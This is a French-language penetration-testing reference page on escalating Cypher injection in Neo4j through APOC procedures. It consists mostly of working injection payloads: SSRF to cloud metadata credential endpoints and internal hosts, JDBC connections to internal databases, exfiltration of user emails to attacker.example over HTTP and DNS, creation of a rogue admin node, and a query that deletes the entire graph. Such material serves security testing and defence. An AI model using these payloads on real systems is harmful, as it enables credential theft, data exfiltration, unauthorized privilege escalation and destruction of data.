---
order: 3
title: "Abus de procédures APOC via injection Cypher dans Neo4j"
description: "Atteindre les procédures APOC via l'injection de CALL transforme une faille Cypher en SSRF, exfiltration sortante, accès aux fichiers et écritures de graphe arbitraires sur Neo4j."
keywords:
  - abus d'APOC
  - injection CALL Neo4j
  - SSRF apoc.load.json
  - apoc.load.jdbc
  - exfiltration Cypher
  - écritures de graphe arbitraires
---

# Abus de procédures APOC

APOC (« Awesome Procedures On Cypher ») est une bibliothèque d'extension Neo4j largement installée. De nombreux déploiements l'activent pour le chargement de données et l'intégration, ce qui signifie qu'une injection Cypher capable d'atteindre une clause `CALL` (voir [Injection Cypher](cypher-injection.md)) atteint souvent APOC. Ces procédures effectuent des requêtes sortantes, lisent et écrivent des fichiers et exécutent d'autre Cypher, transformant une faille de requête en lecture seule en SSRF, exfiltration et écritures de graphe arbitraires. L'exécution de commandes du système d'exploitation n'est pas une capacité intégrée d'APOC ; elle requiert une procédure personnalisée que quelqu'un a installée (traitée ci-dessous).

## Atteindre CALL depuis un point d'injection

Fermez le littéral, écartez la queue et ajoutez `CALL` :

```
' CALL apoc.help('apoc') YIELD name RETURN name //
```

`apoc.help` énumère quelles procédures APOC sont présentes, c'est donc une première sonde utile pour savoir ce que la cible autorise.

## SSRF et requêtes sortantes

`apoc.load.json` et `apoc.load.jsonParams` récupèrent une URL depuis l'intérieur de la base de données. Pointées vers des hôtes internes ou les métadonnées cloud, c'est de la server-side request forgery depuis la couche base de données :

```
' CALL apoc.load.json('http://169.254.169.254/latest/meta-data/iam/security-credentials/') YIELD value RETURN value //
' CALL apoc.load.json('http://internal-admin.local/') YIELD value RETURN value //
```

`apoc.load.jdbc` ouvre une connexion JDBC vers une chaîne de connexion arbitraire, atteignant des bases de données internes ou, avec une URL conçue, des comportements spécifiques au driver :

```
' CALL apoc.load.jdbc('jdbc:postgresql://10.0.0.5/app?user=postgres','SELECT version()') YIELD row RETURN row //
```

## Exfiltration sortante

Les mêmes procédures de requête transportent des données vers l'extérieur. Repliez le contenu de graphe extrait dans la requête pour que la réponse (ou un écouteur contrôlé) le reçoive :

```
' WITH 1 AS x MATCH (u:User)
  WITH collect(u.email) AS data
  CALL apoc.load.jsonParams('http://attacker.example/x', {}, apoc.convert.toJson(data)) YIELD value
  RETURN value //
```

Lorsque le DNS est la seule sortie, encodez les données dans un nom d'hôte et résolvez-le :

```
' CALL apoc.load.json('http://'+apoc.convert.toJson(1)+'.attacker.example/') YIELD value RETURN value //
```

`apoc.export.csv.*` / `apoc.export.json.*` écrivent les résultats de requête dans un fichier là où l'export de fichiers est activé, utile lorsqu'un chemin inscriptible est servi ou récupéré ultérieurement.

## Exécuter davantage de Cypher

`apoc.cypher.run`, `apoc.cypher.runMany` et `apoc.cypher.doIt` exécutent une chaîne Cypher. `doIt` exécute des opérations d'écriture même dans un contexte par ailleurs en lecture, de sorte qu'un point d'injection en lecture seule peut escalader vers des écritures :

```
' CALL apoc.cypher.doIt('CREATE (:User {name:\'pwn\', role:\'admin\'})', {}) YIELD value RETURN value //
' CALL apoc.cypher.runMany('MATCH (n) DETACH DELETE n', {}) YIELD result RETURN result //
```

Comme elles prennent la sous-requête sous forme de chaîne, elles aident aussi à échapper aux filtres qui n'inspectent que l'instruction externe.

## Écritures et atteinte de l'hôte

APOC ne fournit pas d'exécuteur de commandes du système d'exploitation. Les procédures `apoc.cypher.*` ci-dessus escaladent déjà un point en lecture seule vers des écritures de graphe arbitraires, et `apoc.load.jdbc` / `apoc.load.json` atteignent des services internes et le système de fichiers. L'exécution de commandes OS requiert une procédure définie par l'utilisateur **personnalisée** que quelqu'un a empaquetée en plugin et autorisée sur le serveur ; là où elle existe, une injection qui atteint `CALL` l'atteint aussi. Ne supposez pas qu'une procédure de shell intégrée telle que `apoc.systemdb.execute` exécute des commandes, car elle exécute du Cypher contre la base de données système de Neo4j, pas l'OS. Énumérez d'abord la véritable surface appelable et travaillez à partir de ce qui est réellement présent :

```
' CALL apoc.help('apoc') YIELD name RETURN name //
' CALL dbms.procedures() YIELD name, signature RETURN name, signature //
```

`dbms.procedures()` est remplacée par `SHOW PROCEDURES` sur les versions plus récentes.

## Outils

- **cypher-shell** : énumérer et invoquer les procédures APOC directement contre la base de données.
- **Burp Repeater** : livrer des payloads CALL via le paramètre vulnérable.

## Références

- [APOC : load.json / load.jsonParams](https://neo4j.com/docs/apoc/current/import/load-json/)
- [APOC : load.jdbc](https://neo4j.com/labs/apoc/4.4/database-integration/load-jdbc/)
- [APOC : apoc.cypher.* procedures](https://neo4j.com/docs/apoc/current/cypher-execution/)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
